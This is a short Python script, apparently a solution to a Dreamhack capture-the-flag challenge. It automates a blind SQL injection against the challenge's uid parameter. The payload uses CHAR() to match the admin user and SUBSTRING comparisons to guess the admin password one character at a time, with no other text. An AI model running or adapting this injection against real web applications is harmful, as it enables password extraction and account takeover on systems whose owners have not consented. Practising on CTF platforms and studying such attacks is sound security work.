import requests
import string
import urllib.parse


charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
target_url = "http://host8.dreamhack.games:11474/?uid="
received_flag_content = ""

for i in range(4, 44):
    for char in charset:
        res = requests.get(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")
        print(f"Tried {received_flag_content}{char}")
        print(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")

        if "admin" in res.text:
            received_flag_content += char
            print(f'GOT {received_flag_content}')
            print()
            break

print(f"Flag content {received_flag_content}")